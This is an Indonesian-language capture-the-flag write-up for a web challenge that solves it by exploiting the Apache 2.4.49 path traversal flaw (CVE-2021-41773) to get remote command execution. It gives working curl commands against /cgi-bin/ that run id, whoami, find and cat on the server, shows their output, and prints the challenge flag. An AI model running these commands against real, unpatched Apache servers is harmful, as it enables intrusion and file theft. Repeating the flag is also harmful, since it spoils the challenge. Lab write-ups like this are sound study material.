# Apache Tears — Writeup

**Category    :** Web  
**Difficulty  :** Medium  
**Target      :** http://apache-tears.sctf.my.id  
**Target      :** http://103.127.98.249:8085/  
**Description :**

Di sebuah kota tua, ada perpustakaan bersejarah yang baru saja membuka pintunya kembali setelah renovasi.
Pengelolanya bangga — koleksi lamanya masih lengkap, sistem baru sudah terpasang, semua tampak sempurna.

Tapi ada satu lorong yang dibangun terburu-buru. Satu pintu yang tidak terkunci dengan benar.
Satu jalan yang seharusnya tidak menuju ke mana-mana, tapi nyatanya bisa membawamu ke mana saja.

Temukan lorong itu.

## Solve

Pada halaman web nya tertulis versi dari web nya yaitu `2.4.49`, itu ada pada `CVE-2021-41773` yang berisi bug path traversal : `/.%2e/.%2e/.%2e/.%2e/etc/passwd`.

Pertama-tama kita mulai set target origin nya dulu di terminal tetapi hostnya tetap apache-tears.sctf.my.id 
```origin
BASE='http://103.127.98.249:8085'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
``` 

Lalu kita coba tes RCE
```rce
curl -i -sS --path-as-is "$BASE/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -H "Host: apache-tears.sctf.my.id" \
  -H "User-Agent: $UA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'echo; id; whoami' | head -80
```

outpunya 
```output_rce
HTTP/1.1 200 OK
Date: Fri, 03 Jul 2026 14:12:23 GMT
Server: Apache/2.4.49 (Unix)
Transfer-Encoding: chunked

uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
```

Karna berhasil menjalankan command uid dan whoami, maka RCE berhasil. Lalu kita coba cari flag nya

```seach_flag
curl -sS --path-as-is "$BASE/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -H "Host: apache-tears.sctf.my.id" \
  -H "User-Agent: $UA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'echo; find / -type f -iname "*flag*" 2>/dev/null'
```

output
```output_search
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/flag.txt
```

Ternyata ditemukannya `/flag.txt`, maka kita coba baca isi dari file flag.txt nya

```cat
curl -sS --path-as-is "$BASE/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -H "Host: apache-tears.sctf.my.id" \
  -H "User-Agent: $UA" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'echo; cat /flag.txt'
```

output
```hasil_cat
SCTF26{4p4ch3_p4th_tr4v3rs4l_cve_2021_41773}
```

## Flag

```text
SCTF26{4p4ch3_p4th_tr4v3rs4l_cve_2021_41773}
```
